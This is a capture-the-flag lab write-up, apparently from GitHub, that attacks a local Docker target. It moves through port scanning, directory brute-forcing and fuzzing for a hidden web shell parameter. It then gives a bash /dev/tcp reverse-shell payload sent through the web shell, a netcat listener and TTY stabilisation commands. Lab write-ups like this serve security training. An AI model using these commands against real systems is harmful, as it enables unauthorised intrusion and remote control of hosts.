![image](https://github.com/user-attachments/assets/b22fc6d1-75fc-4d2b-b005-97c7dc0a66a8)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p80 172.17.0.2 -oN targeted
```
![Pasted image 20250124131455](https://github.com/user-attachments/assets/697339da-a0e7-4b30-b63f-f5b617abee52)
![Pasted image 20250124131527](https://github.com/user-attachments/assets/44890f1a-a5d3-4d0f-98cd-f1c6440970d5)

## **inside the web site we found this message that may be a clue**

![Pasted image 20250124131607](https://github.com/user-attachments/assets/be8383c3-840f-4777-916a-648f70fcf08e)

## **the only port open is port 80 we have no other way to gain access so we could look for a vulnerability in the apache version or do a reconnaissance looking for hidden directories.**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html
```
![Pasted image 20250124131901](https://github.com/user-attachments/assets/f27ae677-9446-4b91-8337-52f8a46eb121)

## **we get several hidden directories we will start investigating**

![Pasted image 20250124131952](https://github.com/user-attachments/assets/4b8b5428-5611-4124-9d40-500922842c84)
![Pasted image 20250124132012](https://github.com/user-attachments/assets/e31be5f7-8fbc-491f-be06-30e819961878)
![Pasted image 20250124132049](https://github.com/user-attachments/assets/7765e5af-c38f-45dd-8711-65380038632e)
![Pasted image 20250124132121](https://github.com/user-attachments/assets/8cdb38bf-e9c6-4646-b805-ff5ab6623fef)
![Pasted image 20250124132211](https://github.com/user-attachments/assets/b3299736-f2d9-4257-8bd7-26434315a5a5)

## **this is all the information we have found in one of which we are told that the hacker used a web shell but he does not remember the parameter
here is an example of a web shell**

![Pasted image 20250124132804](https://github.com/user-attachments/assets/00955073-d328-405d-84e5-06faae2aaae1)

## **now we have to look for the parameter applying fuzzing with 'wfuzz' where we will replace the values of a list by the value of “x”.**
```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
```
![Pasted image 20250124133708](https://github.com/user-attachments/assets/3cdc74f7-e2a9-4c93-9d3a-cecf24d5dd50)

## **using the above format we enter the web**

![Pasted image 20250124133822](https://github.com/user-attachments/assets/ad63e6cd-e85d-4152-94d2-0ec27fd6b80b)

## **now we have access to our access now we have to send a remote shell to our pc**
```bash
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.1.228/443 0>%261"
```
![Pasted image 20250124134240](https://github.com/user-attachments/assets/cbb15098-89b3-4510-ac1c-36c7c38479eb)

## **and we will listen in on our attacker's machine.**
```bash
nc -nlvp 443
```
![Pasted image 20250124134338](https://github.com/user-attachments/assets/7157618a-f9b1-417b-9141-a6fee8b806fc)

## **we already have access as the user www-data what remains now is to do a treatment of the tty**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
![Pasted image 20250124134804](https://github.com/user-attachments/assets/d524407f-c818-4b5f-94d1-43ae857a5054)
